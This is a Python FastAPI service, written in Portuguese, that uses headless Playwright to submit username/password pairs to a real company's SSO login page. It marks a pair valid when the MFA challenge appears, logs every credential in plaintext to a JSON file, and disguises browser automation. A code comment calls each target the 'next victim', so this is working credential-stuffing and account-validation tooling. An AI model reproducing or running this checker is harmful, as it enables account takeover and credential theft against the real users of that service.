import asyncio
import json
import logging
import os
from datetime import datetime
from pathlib import Path
from typing import Optional

from fastapi import FastAPI
from pydantic import BaseModel
import uvicorn
from playwright.async_api import async_playwright, Browser, BrowserContext, Page, Playwright

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("vr-worker")

app = FastAPI(title="VR SSO Auth Worker", version="2.0.0")

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")

URL_LOGIN = "https://sso-acesso.vr.com.br/u/login?state=hKFo2SA5anVWVzM1WFlDUWwtcHZQMlFsZnJjZllJNktORjVXX6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNWelFtSWswQzJDSUJ3WWJzQ3ZnajlDUXpSMGJZSXF4o2NpZNkgSzRzQmJmVTVMM3RVcFFOT2NxWWc1OVA3TTI0S3ludUw"
SELECTOR_USERNAME = "#username"
SELECTOR_PASSWORD = "#password"
SELECTOR_CONTINUAR = 'button[data-action-button-primary="true"]'
MFA_URL_PATTERN = "**/u/mfa-email-challenge?state=*"

class TesteRequest(BaseModel):
    usuario: str
    senha: str

class WorkerState:
    playwright: Optional[Playwright] = None
    browser: Optional[Browser] = None
    context: Optional[BrowserContext] = None
    page: Optional[Page] = None
    is_ready: bool = False
    lock: asyncio.Lock = asyncio.Lock()

state = WorkerState()

async def obter_browser():
    """Garante que a instância do Chromium esteja conectada com auto-recovery."""
    try:
        if state.browser and state.browser.is_connected():
            return state.browser
    except Exception:
        pass

    logger.info("[WARM WORKER] Conectando motor Chromium...")
    try:
        if state.playwright:
            try:
                await state.playwright.stop()
            except Exception:
                pass
        state.playwright = await async_playwright().start()
        state.browser = await state.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage"
            ]
        )
        state.context = None
        state.page = None
    except Exception as e:
        logger.error(f"[WARM WORKER] Falha ao iniciar browser: {e}")
        raise e
    return state.browser

async def preparar_pagina():
    """Pré-carrega o formulário do SSO da VR com cookies e bundles em memória."""
    try:
        state.is_ready = False
        await obter_browser()

        # Tenta reaproveitar a página existente (navegação interna muito mais rápida)
        if state.page and not state.page.is_closed():
            try:
                logger.info("[WARM WORKER] Reciclando aba em memória...")
                await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=25000)
                await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=15000)
                await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=15000)
                state.is_ready = True
                logger.info("[WARM WORKER] ✅ Aba 100% pronta e reciclada!")
                return
            except Exception as rec_err:
                logger.warning(f"[WARM WORKER] Falha ao reciclar aba: {rec_err}. Recriando...")
                try:
                    await state.page.close()
                except Exception:
                    pass

        # Cria novo contexto se necessário
        if not state.context:
            state.context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 800},
                locale="pt-BR"
            )

        state.page = await state.context.new_page()
        logger.info("[WARM WORKER] Carregando nova aba no SSO da VR...")
        await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
        await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
        await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)

        state.is_ready = True
        logger.info("[WARM WORKER] ✅ Página 100% pronta e pré-aquecida para autenticação instantânea!")
    except Exception as e:
        logger.error(f"[WARM WORKER] Erro ao pré-aquecer página: {e}")
        state.is_ready = False
        await asyncio.sleep(2)
        asyncio.create_task(preparar_pagina())

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(preparar_pagina())

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("[WARM WORKER] Encerrando Chromium e Playwright...")
    if state.page and not state.page.is_closed():
        await state.page.close()
    if state.context:
        await state.context.close()
    if state.browser:
        await state.browser.close()
    if state.playwright:
        await state.playwright.stop()

@app.get("/health")
async def health():
    return {
        "status": "ready" if state.is_ready else "warming",
        "has_browser": state.browser is not None and state.browser.is_connected() if state.browser else False,
        "is_ready": state.is_ready
    }

def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str, url_final: str = ""):
    novo_log = {
        "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "valido": valido,
        "nome": usuario,
        "senha": senha,
        "mensagem": mensagem,
        "url_final": url_final
    }

    logs = []
    if RESULTADO_JSON.exists():
        try:
            with open(RESULTADO_JSON, "r", encoding="utf-8-sig") as f:
                logs = json.load(f)
                if not isinstance(logs, list):
                    logs = []
        except Exception:
            logs = []

    logs.append(novo_log)
    try:
        with open(RESULTADO_JSON, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Erro ao gravar resultado.json: {e}")

@app.post("/testar")
async def testar_credenciais(req: TesteRequest):
    usuario = req.usuario.strip()
    senha = req.senha

    async with state.lock:
        if not state.is_ready or not state.page or state.page.is_closed():
            logger.warning("[WARM WORKER] Página não estava pronta, aguardando carregamento...")
            await preparar_pagina()

        page = state.page
        inicio = asyncio.get_event_loop().time()
        logger.info(f"[WARM WORKER] Testando instantaneamente: {usuario}")

        try:
            # 1. Preenchimento instantâneo (Aba já está aberta no formulário)
            await page.fill(SELECTOR_USERNAME, usuario)
            await page.fill(SELECTOR_PASSWORD, senha)
            await page.click(SELECTOR_CONTINUAR)

            # 2. Loop de detecção ativa (300ms)
            resultado_valido = None
            msg_resultado = ""

            for _ in range(25): # até ~7.5s max
                await asyncio.sleep(0.3)
                url_atual = page.url

                # Se avançou para MFA -> Válido
                if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                    resultado_valido = True
                    msg_resultado = "Login válido - etapa de código encontrada"
                    break

                # Se detectou erro no DOM -> Inválido
                try:
                    erro_locator = page.locator("#error-element-password, [data-error-code], .ulp-alert-danger, .ulp-input-error-message, .alert-danger, span[id*='error']")
                    count = await erro_locator.count()
                    if count > 0:
                        for i in range(count):
                            el = erro_locator.nth(i)
                            if await el.is_visible():
                                txt = (await el.inner_text()).strip()
                                if txt:
                                    resultado_valido = False
                                    msg_resultado = f"Credenciais incorretas na VR: {txt}"
                                    break
                    if resultado_valido is False:
                        break
                except Exception:
                    pass

            url_final = page.url
            if resultado_valido is None:
                if "mfa-email-challenge" in url_final or "mfa" in url_final.lower():
                    resultado_valido = True
                    msg_resultado = "Login válido - etapa de código encontrada"
                else:
                    resultado_valido = False
                    msg_resultado = "Login inválido ou etapa de código não encontrada."

            duracao = asyncio.get_event_loop().time() - inicio
            logger.info(f"[WARM WORKER] Veredito em {duracao:.2f}s: {'VÁLIDO' if resultado_valido else 'INVÁLIDO'} ({msg_resultado})")

            # Salva resultado no log
            salvar_resultado_local(usuario, senha, resultado_valido, msg_resultado, url_final)

            # Agenda pré-aquecimento assíncrono para a próxima vítima
            asyncio.create_task(preparar_pagina())

            return {
                "success": True,
                "usuario": usuario,
                "valido": resultado_valido,
                "status_credencial": "valido" if resultado_valido else "invalido",
                "mensagem": msg_resultado,
                "tempo_segundos": round(duracao, 2),
                "url_final": url_final
            }

        except Exception as err:
            logger.error(f"[WARM WORKER] Falha na execução: {err}")
            asyncio.create_task(preparar_pagina())
            return {
                "success": False,
                "usuario": usuario,
                "valido": False,
                "status_credencial": "invalido",
                "mensagem": f"Erro interno no worker: {err}"
            }

if __name__ == "__main__":
    host = os.getenv("HOST", "127.0.0.1")
    port = int(os.getenv("PORT", "3005"))
    uvicorn.run("bot_service:app", host=host, port=port, log_level="info")
